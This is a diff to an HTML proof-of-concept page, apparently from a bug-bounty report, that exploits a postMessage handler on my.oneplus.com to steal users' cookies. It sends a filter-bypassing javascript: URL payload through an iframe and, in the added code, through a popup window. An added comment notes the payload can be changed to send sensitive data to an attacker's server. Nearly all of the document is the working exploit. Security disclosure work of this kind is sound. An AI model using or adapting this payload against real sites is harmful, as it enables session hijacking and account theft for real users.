@@ -5,6 +5,8 @@
 Steal user's cookies
 <textarea id="cookie" width=500px height=600px style="margin: 0px; height: 330px; width: 505px;"></textarea>
 </div>
+<button id="openH1">Other way-Click Here for start</button>
+<button id="stealaccount">Show customers's cookies with pop-windows</button>
 <script>
 var victim = document.getElementById('sendmessage').contentWindow;
 window.addEventListener('message', function(e) {
@@ -17,5 +19,20 @@ var payload = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptc
 setTimeout(function(){
 	victim.postMessage(payload,"*");
 }, 5000);
+
+	
+	//Other ways only pop the window for show cookies
+function openWin(){
+	h1Win = window.open("https://my.oneplus.com/cn/order?from=head#/");
+	}
+
+function sendMessage(){
+	var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
+	//you can change the url payload for send back some sensitive information to the attacker's server
+	h1Win.postMessage(data,"*");
+	}
+	
+document.getElementById("openH1").addEventListener('click', openWin);
+document.getElementById("stealaccount").addEventListener('click', sendMessage);
 </script>
 </html>
